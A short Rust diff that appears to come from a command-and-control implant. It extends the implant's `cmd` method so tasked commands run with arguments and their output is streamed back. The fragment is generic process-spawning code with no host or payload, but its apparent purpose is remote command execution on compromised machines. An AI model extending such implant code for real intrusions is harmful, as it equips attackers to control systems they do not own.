@@ -50,7 +50,11 @@ impl Implant {
 
     pub async fn cmd(&mut self, task: Task) -> Result<()> {
         let stream = async_stream::stream! {
-            let mut output = Command::new(task.code.0).stdout(std::process::Stdio::piped()).spawn().unwrap();
+            let mut cmd = Command::new(task.code.0);
+            if let Some(args) = task.code.1 {
+                cmd.args(args);
+            }
+            let mut output = cmd.stdout(std::process::Stdio::piped()).spawn().unwrap();
             let mut lines = BufReader::new(output.stdout.take().unwrap()).lines();
 
             while let Some(line) = lines.next_line().await.unwrap() {
